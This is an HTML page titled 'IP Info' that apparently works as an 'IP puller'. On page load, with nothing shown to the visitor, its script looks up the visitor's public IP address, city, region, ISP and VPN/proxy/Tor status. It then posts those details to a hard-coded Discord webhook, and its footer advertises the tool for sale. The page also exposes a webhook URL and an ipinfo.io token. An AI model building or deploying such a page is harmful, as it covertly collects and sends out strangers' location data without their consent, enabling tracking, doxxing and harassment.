<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Info</title>
</head>
<body>
    <script>
        // Send data to Discord Webhook
        async function sendToDiscord(ipInfo) {
            const webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
            
            const discordMessage = {
                content: "@everyone",
                embeds: [
                    {
                        image: {
                            url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                        },
                        title: "King von IP puller",
                        fields: [
                            {
                                name: "IP Address", 
                                value: ipInfo.ip, 
                                inline: true
                            },
                            {
                                name: "City", 
                                value: ipInfo.city || "N/A", 
                                inline: true
                            },
                            {
                                name: "Region", 
                                value: ipInfo.region || "N/A", 
                                inline: true
                            },
                            {
                                name: "Country", 
                                value: ipInfo.country || "N/A", 
                                inline: true
                            },
                            {
                                name: "Organization", 
                                value: ipInfo.org || "N/A", 
                                inline: true
                            },
                            {
                                name: "ASN", 
                                value: ipInfo.asn || "N/A", 
                                inline: true
                            },
                            {
                                name: "VPN", 
                                value: ipInfo.privacy?.vpn ? "True" : "False", 
                                inline: true
                            },
                            {
                                name: "Proxy", 
                                value: ipInfo.privacy?.proxy ? "True" : "False", 
                                inline: true
                            },
                            {
                                name: "TOR", 
                                value: ipInfo.privacy?.tor ? "True" : "False", 
                                inline: true
                            }
                        ],
                        color: 0x007BFF,
                        footer: {
                            text: "BY RUNTZ PURCHASE TODAY!"
                        }
                    }
                ]
            };

            // Send the POST request to Discord
            await fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(discordMessage)
            })
            .then(response => {
                console.log('Data sent to Discord:', response);
            })
            .catch(error => {
                console.error('Error sending to Discord:', error);
            });
        }

        // Get IP information and send it to Discord
        async function getVisitorInfo() {
            try {
                // Fetch the public IP address
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;

                // Fetch the detailed IP information using ipinfo.io
                const ipInfoResponse = await fetch(`https://ipinfo.io/${userIP}/json?token=5f02d3fa0f98e2`);
                const ipInfo = await ipInfoResponse.json();

                console.log('IP Information:', ipInfo); // Debugging line

                // Send the IP info to Discord
                await sendToDiscord(ipInfo);
            } catch (error) {
                console.error('Error fetching visitor information:', error);
            }
        }

        // Call the function to get visitor info
        getVisitorInfo();
    </script>
</body>
</html>
